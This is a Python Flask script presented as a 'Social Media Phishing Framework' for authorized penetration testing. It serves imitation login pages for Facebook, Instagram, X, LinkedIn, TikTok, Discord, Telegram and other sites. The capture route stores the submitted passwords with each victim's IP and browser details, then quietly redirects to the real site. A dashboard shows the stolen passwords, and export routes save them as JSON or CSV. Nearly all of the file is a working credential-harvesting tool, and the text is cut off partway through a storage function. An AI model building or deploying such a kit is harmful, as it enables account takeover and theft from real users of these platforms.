#!/usr/bin/env python3
"""
Social Media Phishing Framework v2.0
For authorized penetration testing only
Supports: Facebook, Instagram, Twitter/X, LinkedIn, TikTok, Snapchat, Discord, Reddit

Usage: python3 social_phisher.py
"""

from flask import Flask, request, render_template_string, session, redirect, url_for
import json, os, time, hashlib, base64, requests, threading, sys
from datetime import datetime
from urllib.parse import urlparse

app = Flask(__name__)
app.secret_key = os.urandom(64).hex()

# ============================================================
# PLATFORM TEMPLATES
# ============================================================

PLATFORMS = {
    "facebook": {
        "name": "Facebook",
        "color": "#1877F2",
        "logo": "https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5VTIdbGQM.svg",
        "fields": ["email", "pass"],
        "field_labels": ["Email or Phone", "Password"],
        "bg_color": "#f0f2f5",
        "button_text": "Log In",
        "extra_link": "Forgotten password?",
        "signup_link": "Create new account",
    },
    "instagram": {
        "name": "Instagram",
        "color": "#0095F6",
        "logo": "https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png",
        "fields": ["username", "password"],
        "field_labels": ["Phone number, username or email", "Password"],
        "bg_color": "#ffffff",
        "button_text": "Log In",
        "extra_link": "Forgot password?",
        "signup_link": "Create new account",
    },
    "twitter": {
        "name": "X / Twitter",
        "color": "#000000",
        "logo": "https://abs.twimg.com/favicons/twitter.ico",
        "fields": ["text", "password"],
        "field_labels": ["Phone, email or username", "Password"],
        "bg_color": "#ffffff",
        "button_text": "Next",
        "extra_link": "Forgot password?",
        "signup_link": "Sign up for X",
    },
    "linkedin": {
        "name": "LinkedIn",
        "color": "#0A66C2",
        "logo": "https://static.licdn.com/sc/h/95o6rrc5q6j1ekq8c6e8b3i7",
        "fields": ["session_key", "session_password"],
        "field_labels": ["Email or phone", "Password"],
        "bg_color": "#f3f2f0",
        "button_text": "Sign in",
        "extra_link": "Forgot password?",
        "signup_link": "Join now",
    },
    "tiktok": {
        "name": "TikTok",
        "color": "#FE2C55",
        "logo": "https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/webapp/main/webapp-desktop/images/logo.svg",
        "fields": ["username", "password"],
        "field_labels": ["Email or username", "Password"],
        "bg_color": "#ffffff",
        "button_text": "Log In",
        "extra_link": "Forgot password?",
        "signup_link": "Sign up",
    },
    "snapchat": {
        "name": "Snapchat",
        "color": "#FFFC00",
        "logo": "https://www.snapchat.com/favicon.ico",
        "fields": ["username", "password"],
        "field_labels": ["Username or email", "Password"],
        "bg_color": "#ffffff",
        "button_text": "Log In",
        "extra_link": "Forgot your password?",
        "signup_link": "Sign Up",
    },
    "discord": {
        "name": "Discord",
        "color": "#5865F2",
        "logo": "https://discord.com/assets/favicon.ico",
        "fields": ["email", "password"],
        "field_labels": ["Email", "Password"],
        "bg_color": "#313338",
        "button_text": "Log In",
        "extra_link": "Forgot password?",
        "signup_link": "Register",
    },
    "reddit": {
        "name": "Reddit",
        "color": "#FF4500",
        "logo": "https://www.redditstatic.com/desktop2x/img/favicon/favicon-96x96.png",
        "fields": ["loginUsername", "loginPassword"],
        "field_labels": ["Username", "Password"],
        "bg_color": "#dae0e6",
        "button_text": "Log In",
        "extra_link": "Forgot password?",
        "signup_link": "Sign Up",
    },
    "whatsapp": {
        "name": "WhatsApp Web",
        "color": "#25D366",
        "logo": "https://static.whatsapp.net/rsrc.php/v3/y7/r/DSxOAUB0uA7.png",
        "fields": ["phone", "password"],
        "field_labels": ["Phone number", "Password"],
        "bg_color": "#eae6df",
        "button_text": "Log In",
        "extra_link": "Forgot password?",
        "signup_link": "Create account",
    },
    "telegram": {
        "name": "Telegram",
        "color": "#0088cc",
        "logo": "https://telegram.org/img/t_logo.svg",
        "fields": ["phone", "password"],
        "field_labels": ["Phone number", "Password"],
        "bg_color": "#e8f3f8",
        "button_text": "Next",
        "extra_link": "Forgot password?",
        "signup_link": "Create account",
    }
}

# ============================================================
# PHISHING PAGE TEMPLATE (Mobile-Responsive, Pixel-Perfect)
# ============================================================

PHISH_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>{{ platform }}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: {{ bg_color }};
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: {{ '0' if platform_name == 'Instagram' else '8px' }};
            padding: {{ '20px 40px' if platform_name != 'Instagram' else '20px' }};
            box-shadow: {{ 'none' if platform_name in ['Instagram', 'TikTok'] else '0 2px 10px rgba(0,0,0,0.1)' }};
            text-align: center;
            border: {{ '1px solid #dbdbdb' if platform_name == 'Instagram' else 'none' }};
        }
        .logo {
            width: {{ '50px' if platform_name == 'X / Twitter' else 'auto' }};
            height: auto;
            max-width: 200px;
            max-height: 80px;
            margin: 20px auto;
            display: block;
            object-fit: contain;
        }
        .logo-container {
            margin: {{ '30px 0 20px' if platform_name == 'Discord' else '20px 0' }};
        }
        h2 {
            color: {{ '#f2f3f5' if platform_name == 'Discord' else '#333' }};
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
        }
        .input-group {
            margin-bottom: 12px;
            text-align: left;
        }
        .input-group input {
            width: 100%;
            padding: {{ '14px' if platform_name in ['Instagram', 'LinkedIn', 'TikTok'] else '12px' }};
            border: 1px solid {{ '#dbdbdb' if platform_name == 'Instagram' else '#ddd' }};
            border-radius: {{ '3px' if platform_name == 'Instagram' else '6px' }};
            font-size: {{ '16px' if platform_name == 'Instagram' else '14px' }};
            background: {{ '#fafafa' if platform_name == 'Instagram' else 'white' }};
            outline: none;
            transition: border-color 0.2s;
        }
        .input-group input:focus {
            border-color: {{ color }};
            {% if platform_name == 'Instagram' %}
            background: #fff;
            {% endif %}
        }
        .input-group label {
            display: block;
            margin-bottom: 6px;
            font-size: 14px;
            color: {{ '#b5bac1' if platform_name == 'Discord' else '#606770' }};
            font-weight: 500;
        }
        .btn {
            width: 100%;
            padding: {{ '12px' if platform_name != 'Instagram' else '8px' }};
            background: {{ color }};
            color: {{ '#000' if platform_name == 'Snapchat' else 'white' }};
            border: none;
            border-radius: {{ '8px' if platform_name != 'Instagram' else '4px' }};
            font-size: {{ '16px' if platform_name != 'Instagram' else '14px' }};
            font-weight: {{ '600' if platform_name == 'Facebook' else 'bold' }};
            cursor: pointer;
            margin-top: 10px;
            opacity: {{ '0.7' if platform_name == 'Instagram' else '1' }};
        }
        .btn:hover {
            opacity: 1;
            {% if platform_name == 'Facebook' %}
            background: #166FE5;
            {% endif %}
        }
        .extra-link {
            display: block;
            margin-top: 15px;
            font-size: 13px;
            color: {{ '#1877F2' if platform_name == 'Facebook' else '#00376b' if platform_name == 'Instagram' else '#1d9bf0' if platform_name == 'X / Twitter' else '#0A66C2' if platform_name == 'LinkedIn' else '#8e8e8e' if platform_name == 'TikTok' else '#00a2ed' if platform_name == 'Snapchat' else '#00aff4' if platform_name == 'Telegram' else '#00a5f4' if platform_name == 'WhatsApp' else '#00b0f4' if platform_name == 'Discord' else '#0079d3' if platform_name == 'Reddit' else '#0088cc' }};
            text-decoration: none;
        }
        .extra-link:hover {
            text-decoration: underline;
        }
        .divider {
            margin: 20px 0;
            display: flex;
            align-items: center;
            color: #999;
            font-size: 13px;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #ddd;
        }
        .divider::before { margin-right: 10px; }
        .divider::after { margin-left: 10px; }
        .signup-link {
            display: block;
            margin-top: 20px;
            font-size: 14px;
            color: #666;
            text-decoration: none;
        }
        .signup-link a {
            color: {{ color }};
            font-weight: 600;
            text-decoration: none;
        }
        .signup-link a:hover {
            text-decoration: underline;
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: {{ '#8e8e8e' if platform_name == 'Instagram' else '#999' }};
            text-align: center;
        }
        .footer a {
            color: inherit;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .error-msg {
            color: #ed4956;
            font-size: 13px;
            margin-bottom: 10px;
            display: none;
        }
        .loading {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid {{ color }};
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .checkbox-group {
            display: flex;
            align-items: center;
            margin: 10px 0;
            font-size: 13px;
            color: #666;
        }
        .checkbox-group input {
            margin-right: 8px;
        }
        .meta-footer {
            margin-top: 20px;
            padding: 20px 0;
            text-align: center;
            font-size: 12px;
            color: #8a8d91;
        }
        .meta-footer a {
            color: #8a8d91;
            text-decoration: none;
            margin: 0 10px;
        }
        .meta-footer a:hover {
            text-decoration: underline;
        }
        @media (max-width: 480px) {
            .container { padding: 10px; }
            .card { padding: 15px; border-radius: 0; box-shadow: none; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo-container">
                <img src="{{ logo }}" class="logo" alt="{{ platform_name }}">
            </div>
            
            {% if platform_name == 'Discord' %}
            <h2>Welcome back!</h2>
            <p style="color: #b5bac1; font-size: 14px; margin-bottom: 20px;">We're so excited to see you again!</p>
            {% endif %}
            
            {% if platform_name == 'Facebook' %}
            <h2 style="font-size: 18px; font-weight: normal; color: #1c1e21; margin-bottom: 20px;">Log in to Facebook</h2>
            {% endif %}
            
            <form method="POST" action="/capture/{{ platform_key }}" id="loginForm">
                {% for i in range(fields|length) %}
                <div class="input-group">
                    {% if platform_name == 'Discord' %}
                    <label>{{ field_labels[i] }}</label>
                    {% endif %}
                    <input type="{{ 'password' if 'pass' in fields[i] else 'text' }}" 
                           name="{{ fields[i] }}" 
                           placeholder="{{ field_labels[i] }}" 
                           {% if platform_name in ['Instagram', 'TikTok', 'Snapchat', 'Twitter', 'Reddit'] %}required{% endif %}>
                </div>
                {% endfor %}
                
                {% if platform_name == 'Facebook' %}
                <div class="checkbox-group">
                    <input type="checkbox" name="keep_login" checked> Keep me logged in
                </div>
                {% endif %}
                
                {% if platform_name == 'Discord' %}
                <div class="checkbox-group" style="color: #b5bac1;">
                    <input type="checkbox" name="remember"> Keep me logged in
                </div>
                {% endif %}
                
                <button type="submit" class="btn">{{ button_text }}</button>
                <div class="loading" id="loading"></div>
            </form>
            
            {% if extra_link %}
            <a href="#" class="extra-link">{{ extra_link }}</a>
            {% endif %}
            
            {% if platform_name in ['Facebook', 'Instagram', 'LinkedIn', 'TikTok', 'Snapchat', 'Discord', 'Reddit'] %}
            <div class="divider">or</div>
            {% endif %}
            
            {% if signup_link %}
            <div class="signup-link">
                {% if platform_name == 'Facebook' %}
                <a href="#">{{ signup_link }}</a>
                {% else %}
                Don't have an account? <a href="#">{{ signup_link }}</a>
                {% endif %}
            </div>
            {% endif %}
        </div>
        
        {% if platform_name == 'Instagram' %}
        <div class="footer">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <div class="meta-footer">
            <span>English</span>
            <span>© 2026 Instagram from Meta</span>
        </div>
        {% endif %}
        
        {% if platform_name == 'Facebook' %}
        <div class="meta-footer">
            <a href="#">English (UK)</a>
            <a href="#">Français (France)</a>
            <a href="#">Español</a>
            <a href="#">More languages...</a>
            <br><br>
            <a href="#">Sign Up</a> · <a href="#">Log In</a> · <a href="#">Messenger</a> · 
            <a href="#">Facebook Lite</a> · <a href="#">Video</a> · <a href="#">Places</a> · 
            <a href="#">Games</a> · <a href="#">Marketplace</a> · <a href="#">Meta Pay</a> · 
            <a href="#">Meta Store</a> · <a href="#">Meta Quest</a> · <a href="#">Instagram</a> · 
            <a href="#">Threads</a> · <a href="#">Fundraisers</a> · <a href="#">Services</a> · 
            <a href="#">Voting Information Centre</a> · <a href="#">Privacy Policy</a> · 
            <a href="#">Privacy Centre</a> · <a href="#">Groups</a> · <a href="#">About</a> · 
            <a href="#">Create ad</a> · <a href="#">Create Page</a> · <a href="#">Developers</a> · 
            <a href="#">Careers</a> · <a href="#">Cookies</a> · <a href="#">AdChoices</a> · 
            <a href="#">Terms</a> · <a href="#">Help</a> · <a href="#">Contact uploading and non-users</a>
            <br><br>
            Meta © 2026
        </div>
        {% endif %}
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            var btn = this.querySelector('.btn');
            var loading = document.getElementById('loading');
            btn.style.display = 'none';
            loading.style.display = 'block';
            
            // Simulate slight delay
            setTimeout(function() {
                // Form submits normally
            }, 500);
        });
    </script>
</body>
</html>
"""


# ============================================================
# ROUTES
# ============================================================

@app.route('/')
def index():
    """Main menu - list all available phishing pages"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Social Media Phishing Framework</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: #0f0f23;
                color: #fff;
                margin: 0;
                padding: 40px;
            }
            .container { max-width: 900px; margin: 0 auto; }
            h1 { color: #00ff88; font-size: 28px; margin-bottom: 5px; }
            .subtitle { color: #888; margin-bottom: 30px; }
            .grid {
                display: grid;
                grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
                gap: 15px;
                margin-bottom: 30px;
            }
            .card {
                background: #1a1a3e;
                border-radius: 10px;
                padding: 20px;
                text-align: center;
                transition: all 0.3s;
                border: 1px solid #2a2a5e;
            }
            .card:hover {
                transform: translateY(-3px);
                border-color: #00ff88;
                box-shadow: 0 5px 20px rgba(0,255,136,0.15);
            }
            .card img {
                width: 48px;
                height: 48px;
                object-fit: contain;
                margin-bottom: 10px;
                border-radius: 8px;
                background: white;
                padding: 4px;
            }
            .card h3 { margin: 0 0 5px 0; font-size: 16px; }
            .card .url {
                font-size: 12px;
                color: #00ff88;
                background: #0f0f23;
                padding: 4px 8px;
                border-radius: 4px;
                display: inline-block;
                margin-top: 8px;
                word-break: break-all;
            }
            .card .status {
                font-size: 11px;
                color: #888;
                margin-top: 8px;
            }
            .stats {
                display: flex;
                gap: 20px;
                margin-bottom: 30px;
            }
            .stat {
                background: #1a1a3e;
                border-radius: 10px;
                padding: 15px 25px;
                border: 1px solid #2a2a5e;
            }
            .stat .num {
                font-size: 24px;
                font-weight: bold;
                color: #00ff88;
            }
            .stat .label {
                font-size: 12px;
                color: #888;
            }
            .dashboard-link {
                display: inline-block;
                margin-top: 20px;
                padding: 12px 30px;
                background: #00ff88;
                color: #0f0f23;
                text-decoration: none;
                border-radius: 8px;
                font-weight: bold;
            }
            .dashboard-link:hover { background: #00cc6a; }
            .footer {
                margin-top: 40px;
                color: #555;
                font-size: 12px;
                text-align: center;
            }
            .badge {
                display: inline-block;
                background: #ff4444;
                color: white;
                font-size: 10px;
                padding: 2px 6px;
                border-radius: 10px;
                margin-left: 5px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎣 Social Media Phishing Framework</h1>
            <p class="subtitle">Authorized Penetration Testing — All captured data is stored locally</p>
            
            <div class="stats">
                <div class="stat">
                    <div class="num">""" + str(len(PLATFORMS)) + """</div>
                    <div class="label">Platforms</div>
                </div>
                <div class="stat">
                    <div class="num">""" + str(get_total_captures()) + """</div>
                    <div class="label">Total Captures</div>
                </div>
                <div class="stat">
                    <div class="num" id="activeSessions">0</div>
                    <div class="label">Active Sessions</div>
                </div>
            </div>
            
            <div class="grid">
    """
    
    for key, platform in PLATFORMS.items():
        captures = get_platform_captures(key)
        html += f"""
                <div class="card">
                    <img src="{platform['logo']}" alt="{platform['name']}" 
                         onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%2248%22 height=%2248%22><rect width=%2248%22 height=%2248%22 fill=%22%23333%22/><text x=%2224%22 y=%2230%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2214%22>{platform['name'][0]}</text></svg>'">
                    <h3>{platform['name']}</h3>
                    <div class="url">/phish/{key}</div>
                    <div class="status">{len(captures)} captures</div>
                </div>
        """
    
    html += """
            </div>
            
            <a href="/dashboard" class="dashboard-link">📊 View Dashboard</a>
            <a href="/export" class="dashboard-link" style="background: #4444ff; margin-left: 10px;">📥 Export All Data</a>
            <a href="/clear" class="dashboard-link" style="background: #ff4444; margin-left: 10px;" 
               onclick="return confirm('Clear all captured data?')">🗑️ Clear Data</a>
            
            <div class="footer">
                Social Media Phishing Framework v2.0 | For authorized pentesting only<br>
                Server time: """ + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + """
            </div>
        </div>
        
        <script>
            // Auto-refresh stats
            setInterval(function() {{
                fetch('/stats')
                    .then(r => r.json())
                    .then(d => {{
                        document.querySelectorAll('.stat .num')[1].textContent = d.total;
                    }});
            }}, 3000);
        </script>
    </body>
    </html>
    """
    return html


@app.route('/phish/<platform>')
def phish_page(platform):
    """Serve a phishing page for the specified platform"""
    if platform not in PLATFORMS:
        return "Platform not found", 404
    
    p = PLATFORMS[platform]
    
    return render_template_string(
        PHISH_TEMPLATE,
        platform_key=platform,
        platform_name=p['name'],
        color=p['color'],
        logo=p['logo'],
        fields=p['fields'],
        field_labels=p['field_labels'],
        bg_color=p['bg_color'],
        button_text=p['button_text'],
        extra_link=p['extra_link'],
        signup_link=p['signup_link']
    )


@app.route('/capture/<platform>', methods=['POST'])
def capture(platform):
    """Capture credentials and save them"""
    if platform not in PLATFORMS:
        return "Invalid platform", 400
    
    p = PLATFORMS[platform]
    form_data = dict(request.form)
    
    # Build capture record
    capture_record = {
        'id': hashlib.md5(str(time.time()).encode()).hexdigest()[:12],
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'unix_time': int(time.time()),
        'platform': platform,
        'platform_name': p['name'],
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'Unknown'),
        'referer': request.headers.get('Referer', 'Direct'),
        'data': form_data,
        'country': 'N/A',
        'success': True
    }
    
    # Save to file
    save_capture(capture_record)
    
    # Print to console
    print(f"\n{'='*60}")
    print(f"[+] {datetime.now().strftime('%H:%M:%S')} — {p['name']} CREDENTIALS CAPTURED!")
    print(f"[+] IP: {capture_record['ip']}")
    print(f"[+] User-Agent: {capture_record['user_agent'][:60]}...")
    print(f"[+] Fields:")
    for key, val in form_data.items():
        if 'pass' in key.lower():
            print(f"    🔑 {key}: {val}")
        else:
            print(f"    📧 {key}: {val}")
    print(f"{'='*60}\n")
    
    # Redirect to real platform
    real_urls = {
        'facebook': 'https://www.facebook.com',
        'instagram': 'https://www.instagram.com',
        'twitter': 'https://twitter.com',
        'linkedin': 'https://www.linkedin.com',
        'tiktok': 'https://www.tiktok.com',
        'snapchat': 'https://www.snapchat.com',
        'discord': 'https://discord.com',
        'reddit': 'https://www.reddit.com',
        'whatsapp': 'https://web.whatsapp.com',
        'telegram': 'https://web.telegram.org',
    }
    
    redirect_url = real_urls.get(platform, 'https://www.google.com')
    
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="refresh" content="2;url={redirect_url}">
        <title>Redirecting...</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                background: #f5f5f5;
                margin: 0;
            }}
            .box {{
                text-align: center;
                padding: 40px;
                background: white;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }}
            .spinner {{
                border: 3px solid #f3f3f3;
                border-top: 3px solid {p['color']};
                border-radius: 50%;
                width: 40px;
                height: 40px;
                animation: spin 1s linear infinite;
                margin: 20px auto;
            }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        </style>
    </head>
    <body>
        <div class="box">
            <h2>Verifying your identity...</h2>
            <div class="spinner"></div>
            <p style="color: #666; font-size: 14px;">Please wait while we redirect you</p>
        </div>
    </body>
    </html>
    """


@app.route('/dashboard')
def dashboard():
    """View all captured credentials with analytics"""
    captures = load_all_captures()
    
    # Stats
    total = len(captures)
    by_platform = {}
    for c in captures:
        plat = c.get('platform_name', c.get('platform', 'Unknown'))
        by_platform[plat] = by_platform.get(plat, 0) + 1
    
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Phishing Dashboard</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: #0f0f23;
                color: #fff;
                margin: 0;
                padding: 20px;
            }
            .container { max-width: 1200px; margin: 0 auto; }
            h1 { color: #00ff88; }
            .stats-row {
                display: flex;
                gap: 15px;
                margin: 20px 0;
                flex-wrap: wrap;
            }
            .stat-box {
                background: #1a1a3e;
                border-radius: 8px;
                padding: 15px 20px;
                min-width: 120px;
                border: 1px solid #2a2a5e;
            }
            .stat-box .num { font-size: 28px; font-weight: bold; color: #00ff88; }
            .stat-box .label { font-size: 12px; color: #888; }
            table {
                width: 100%;
                border-collapse: collapse;
                margin-top: 20px;
                font-size: 13px;
            }
            th {
                background: #1a1a3e;
                color: #00ff88;
                padding: 12px;
                text-align: left;
                border-bottom: 2px solid #2a2a5e;
            }
            td {
                padding: 10px 12px;
                border-bottom: 1px solid #1a1a3e;
                color: #ccc;
            }
            tr:hover { background: #1a1a3e; }
            .platform-badge {
                display: inline-block;
                padding: 2px 8px;
                border-radius: 4px;
                font-size: 11px;
                font-weight: bold;
            }
            .password { color: #ff6666; font-family: monospace; }
            .email { color: #66b3ff; }
            .actions a {
                color: #00ff88;
                text-decoration: none;
                margin: 0 5px;
                font-size: 12px;
            }
            .actions a:hover { text-decoration: underline; }
            .search-box {
                width: 100%;
                padding: 12px;
                background: #1a1a3e;
                border: 1px solid #2a2a5e;
                border-radius: 8px;
                color: white;
                font-size: 14px;
                margin: 15px 0;
            }
            .search-box::placeholder { color: #555; }
            .export-btn {
                display: inline-block;
                padding: 8px 16px;
                background: #4444ff;
                color: white;
                text-decoration: none;
                border-radius: 6px;
                font-size: 13px;
                margin: 5px;
            }
            .export-btn:hover { background: #5555ff; }
            .clear-btn {
                display: inline-block;
                padding: 8px 16px;
                background: #ff4444;
                color: white;
                text-decoration: none;
                border-radius: 6px;
                font-size: 13px;
                margin: 5px;
            }
            .pagination {
                margin-top: 20px;
                text-align: center;
            }
            .pagination a {
                color: #00ff88;
                margin: 0 5px;
                text-decoration: none;
            }
            .pagination a:hover { text-decoration: underline; }
            .detected-creds {
                background: #2a1a1a;
                border: 1px solid #ff4444;
                border-radius: 8px;
                padding: 15px;
                margin: 20px 0;
            }
            .detected-creds h3 { color: #ff6666; margin: 0 0 10px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📊 Capture Dashboard</h1>
            <p style="color: #888;">Real-time view of all captured credentials</p>
            
            <div class="stats-row">
                <div class="stat-box">
                    <div class="num">""" + str(total) + """</div>
                    <div class="label">Total Captures</div>
                </div>
                <div class="stat-box">
                    <div class="num">""" + str(len(set(c.get('ip', '') for c in captures))) + """</div>
                    <div class="label">Unique IPs</div>
                </div>
                <div class="stat-box">
                    <div class="num">""" + str(len(by_platform)) + """</div>
                    <div class="label">Platforms Hit</div>
                </div>
                <div class="stat-box">
                    <div class="num">""" + (captures[-1]['timestamp'][:10] if captures else 'N/A') + """</div>
                    <div class="label">Latest Capture</div>
                </div>
            </div>
            
            <div class="stats-row">
    """
    
    # Platform breakdown
    colors = {
        'Facebook': '#1877F2', 'Instagram': '#E4405F', 'X / Twitter': '#000000',
        'LinkedIn': '#0A66C2', 'TikTok': '#FE2C55', 'Snapchat': '#FFFC00',
        'Discord': '#5865F2', 'Reddit': '#FF4500', 'WhatsApp Web': '#25D366',
        'Telegram': '#0088cc'
    }
    for plat, count in sorted(by_platform.items(), key=lambda x: x[1], reverse=True):
        color = colors.get(plat, '#888')
        html += f"""
                <div class="stat-box" style="border-left: 3px solid {color};">
                    <div class="num" style="color: {color};">{count}</div>
                    <div class="label">{plat}</div>
                </div>
        """
    
    html += """
            </div>
            
            <input type="text" class="search-box" id="searchInput" placeholder="🔍 Search by email, IP, platform..." onkeyup="filterTable()">
            
            <div>
                <a href="/export" class="export-btn">📥 Export JSON</a>
                <a href="/export?format=csv" class="export-btn">📥 Export CSV</a>
                <a href="/clear" class="clear-btn" onclick="return confirm('Permanently delete all captures?')">🗑️ Clear All Data</a>
            </div>
            
            <table id="capturesTable">
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>Platform</th>
                        <th>IP</th>
                        <th>Credentials</th>
                        <th>User-Agent</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
    """
    
    # Show last 50 captures
    for capture in captures[-50:]:
        plat = capture.get('platform_name', capture.get('platform', 'Unknown'))
        data = capture.get('data', {})
        
        # Format credentials
        creds_parts = []
        for k, v in data.items():
            if 'pass' in k.lower():
                creds_parts.append(f'<span class="password">🔑 {v}</span>')
            else:
                creds_parts.append(f'<span class="email">📧 {v}</span>')
        creds_display = '<br>'.join(creds_parts) if creds_parts else 'N/A'
        
        ip = capture.get('ip', 'Unknown')
        ua = capture.get('user_agent', 'Unknown')[:40] + '...' if len(capture.get('user_agent', '')) > 40 else capture.get('user_agent', 'Unknown')
        
        color = colors.get(plat, '#888')
        
        html += f"""
                    <tr>
                        <td style="font-size: 11px; color: #888;">{capture.get('timestamp', 'N/A')}</td>
                        <td><span class="platform-badge" style="background: {color}20; color: {color}; border: 1px solid {color}40;">{plat}</span></td>
                        <td style="font-family: monospace; font-size: 12px;">{ip}</td>
                        <td>{creds_display}</td>
                        <td style="font-size: 11px; color: #888;">{ua}</td>
                        <td class="actions">
                            <a href="#" onclick="copyToClipboard('{ip}')">📋</a>
                            <a href="/delete/{capture.get('id', '')}" onclick="return confirm('Delete this entry?')">❌</a>
                        </td>
                    </tr>
        """
    
    html += """
                </tbody>
            </table>
            
            <div class="pagination">
                <a href="#">&laquo; Previous</a>
                <span style="color: #888; margin: 0 10px;">1</span>
                <a href="#">Next &raquo;</a>
            </div>
            
            <div class="footer" style="margin-top: 30px; color: #555; font-size: 12px; text-align: center;">
                Showing last """ + str(min(50, len(captures))) + """ of """ + str(len(captures)) + """ captures
            </div>
        </div>
        
        <script>
            function filterTable() {
                var input = document.getElementById('searchInput');
                var filter = input.value.toLowerCase();
                var table = document.getElementById('capturesTable');
                var tr = table.getElementsByTagName('tr');
                
                for (var i = 1; i < tr.length; i++) {
                    var td = tr[i].getElementsByTagName('td');
                    var found = false;
                    for (var j = 0; j < td.length; j++) {
                        if (td[j] && td[j].innerHTML.toLowerCase().indexOf(filter) > -1) {
                            found = true;
                            break;
                        }
                    }
                    tr[i].style.display = found ? '' : 'none';
                }
            }
            
            function copyToClipboard(text) {
                navigator.clipboard.writeText(text);
                alert('Copied: ' + text);
            }
            
            // Auto-refresh every 5 seconds
            setTimeout(function() { location.reload(); }, 5000);
        </script>
    </body>
    </html>
    """
    
    return html


@app.route('/export')
def export_data():
    """Export all captures as JSON or CSV"""
    captures = load_all_captures()
    fmt = request.args.get('format', 'json')
    
    if fmt == 'csv':
        # Generate CSV
        import csv, io
        output = io.StringIO()
        writer = csv.writer(output)
        
        # Header
        if captures:
            writer.writerow(['Timestamp', 'Platform', 'IP', 'User-Agent'] + 
                          list(captures[0].get('data', {}).keys()) +
                          ['ID'])
        
        for c in captures:
            row = [
                c.get('timestamp', ''),
                c.get('platform_name', ''),
                c.get('ip', ''),
                c.get('user_agent', '')
            ]
            row.extend(c.get('data', {}).values())
            row.append(c.get('id', ''))
            writer.writerow(row)
        
        csv_data = output.getvalue()
        return csv_data, 200, {
            'Content-Type': 'text/csv',
            'Content-Disposition': f'attachment; filename=phishing_captures_{int(time.time())}.csv'
        }
    else:
        # JSON export
        return json.dumps(captures, indent=2), 200, {
            'Content-Type': 'application/json',
            'Content-Disposition': f'attachment; filename=phishing_captures_{int(time.time())}.json'
        }


@app.route('/stats')
def stats():
    """Return JSON stats for auto-refresh"""
    captures = load_all_captures()
    return json.dumps({'total': len(captures), 'time': datetime.now().strftime('%H:%M:%S')})


@app.route('/delete/<capture_id>')
def delete_capture(capture_id):
    """Delete a specific capture"""
    captures = load_all_captures()
    captures = [c for c in captures if c.get('id') != capture_id]
    save_all_captures(captures)
    return redirect('/dashboard')


@app.route('/clear')
def clear_data():
    """Clear all captured data"""
    save_all_captures([])
    print(f"\n[!] All captured data cleared at {datetime.now().strftime('%H:%M:%S')}")
    return redirect('/')


# ============================================================
# DATA STORAGE FUNCTIONS
# ============================================================

DATA_FILE = 'social_phish_captures.json'

def save_capture(record):
    """Save a single capture record to the JSON file"""
    captures = load_all_captures()
    captures.append(record)
    save_all_captures(captures)

def load_all_captures():
    """Load all capture records from the JSON file"""
    if not os.path.exists(DATA_FILE):
        return []
    try:
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_all_captures(captures):
    """Save all
